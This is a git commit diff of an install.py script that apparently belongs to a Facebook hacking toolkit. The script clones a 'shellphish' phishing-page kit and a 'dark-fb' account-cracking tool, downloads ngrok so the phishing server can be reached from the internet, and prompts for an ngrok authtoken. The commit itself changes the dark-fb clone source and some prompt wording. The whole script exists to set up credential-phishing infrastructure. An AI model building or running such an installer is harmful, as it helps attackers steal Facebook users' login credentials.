1f3dfefc70d704c0ac991ff4721c24ac1bded08e
amine10a <50719983+amine10a@users.noreply.github.com>
2020-02-11 08:50:41 +0100

    Update install.py

--- install.py
+++ install.py
@@ -9,15 +9,15 @@ subprocess.Popen("apt install php && apt install curl && apt install git && apt 
 subprocess.Popen(" pip install requests  ", shell=True).wait()
 subprocess.Popen(" pip2 install requests  ", shell=True).wait()
 # git scripts
-subprocess.Popen(" git clone https://github.com/amine10a/shellphish", shell=True).wait()
-subprocess.Popen(" git clone https://github.com/amine10a/dark-fb", shell=True).wait()
-# install ngrok
+subprocess.Popen(" git clone https://github.com/amine10a/shellphish", shell=True).wait()
+subprocess.Popen("git clone https://github.com/V4N654T/dark-fb ", shell=True).wait()
+# install ngrok 
 subprocess.Popen(" wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip ", shell=True).wait()
 subprocess.Popen("unzip ngrok-stable-linux-arm.zip ", shell=True).wait()
 subprocess.Popen("rm -rf ngrok-stable-linux-arm.zip ", shell=True).wait()
 subprocess.Popen("cp ngrok $HOME/Toh-Fb/shellphish", shell=True).wait()
-print(b)
-auth = input('please paste your authtoken here: ')
+print(b,'you can creat account for ngrok ')
+auth = input('please paste your authtoken for ngrok here: ')
 subprocess.Popen("$HOME/Toh-Fb/shellphish/ngrok authtoken",auth, shell=True).wait()
 print(w)
 # my youtube channel
